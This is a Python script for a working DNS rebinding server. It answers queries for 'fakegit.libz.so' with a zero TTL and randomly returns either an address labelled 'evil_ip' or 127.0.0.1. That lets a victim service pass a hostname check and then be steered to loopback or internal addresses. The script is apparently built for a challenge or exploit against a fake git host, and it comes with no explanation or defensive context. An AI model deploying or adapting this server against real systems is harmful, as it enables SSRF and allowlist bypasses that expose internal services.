import ipaddress
import os
import socket
import struct
import sys


def addr_to_dns_repr(addr):
    def label_to_dns_repr(label):
        label = label.encode()
        return bytes([len(label)]) + label

    return b''.join(label_to_dns_repr(label) for label in addr.split('.'))


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('', 53))

A_TYPE = 1
IN_CLASS = 1
EXPECTED_QUERY = addr_to_dns_repr('fakegit.libz.so.') + struct.pack('>HH', A_TYPE, IN_CLASS)
TTL = 0

while True:
    packet, client_addr = sock.recvfrom(512)
    print(f'Got a packet from {client_addr}')

    header_len = 12
    header_fmt = '>' + 'H'*6
    if len(packet) < header_len:
        print(f'Dropping the packet because it it too short ({len(packet)} bytes)', file=sys.stderr)
        continue

    header = packet[:header_len]
    transaction_id, flags, query_count, *_ = struct.unpack(header_fmt, header)

    if query_count != 1:
        print(f'Dropping the packet because it has more than one query', file=sys.stderr)
        continue

    query = packet[header_len:header_len + len(EXPECTED_QUERY)]
    can_answer = query == EXPECTED_QUERY

    # Respond with an single answer to the first query and nothing else.
    answer_count = int(can_answer)
    # Indicate that this message is a response and copy the "recursion desired" bit from the query.
    # Zero out everything else (in particular, unset the "recursion available" bit).
    answer_flags = 0b1000_0000_0000_0000 | (flags & 0b0000_0001_0000_0000)
    response_header = struct.pack(header_fmt, transaction_id, answer_flags, query_count, answer_count, 0, 0)

    answer = b''.join([response_header, query])
    if can_answer:
        evil_ip = '217.10.34.71' if os.urandom(1)[0] % 4 == 0 else '127.0.0.1'
        packed_evil_ip = ipaddress.IPv4Address(evil_ip).packed
        answer += b''.join([
            EXPECTED_QUERY,
            struct.pack('>IH', TTL, len(packed_evil_ip)),
            packed_evil_ip,
        ])
        print(f'Responded with {evil_ip} to an A query')
    else:
        print(f'Sending an empty response to unsupported query: {query}')

    sock.sendto(answer, client_addr)